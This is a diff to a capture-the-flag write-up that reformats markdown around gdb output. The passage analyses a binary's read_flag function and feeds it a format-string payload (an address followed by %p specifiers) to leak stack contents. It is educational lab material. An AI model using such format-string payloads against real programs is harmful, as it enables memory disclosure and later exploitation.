@@ -90,7 +90,8 @@ Dump of assembler code for function read_flag:
    0x0804871a <+54>:    nop
    0x0804871b <+55>:    leave  
    0x0804871c <+56>:    ret    
-End of assembler dump.```
+End of assembler dump.
+```
 
 Here we see this line:
 ```0x080486ea <+6>:    mov    eax,ds:0x804a04c```
@@ -119,7 +120,8 @@ I set a breakpoint after the printf line here with:
 ``` b * 0x080487fe```
 
 Then I run this:
-```run <<< $(python -c 'print "\x4c\xa0\x04\x08%p%p%p%p%p"')```
+>run <<< $(python -c 'print "\x4c\xa0\x04\x08%p%p%p%p%p"')
+
 To start the program and %p prints what is on the stack. I then use ```x/xw $esp``` to see how the stack looks like:
 ```
 gdb-peda$ x/xw $esp
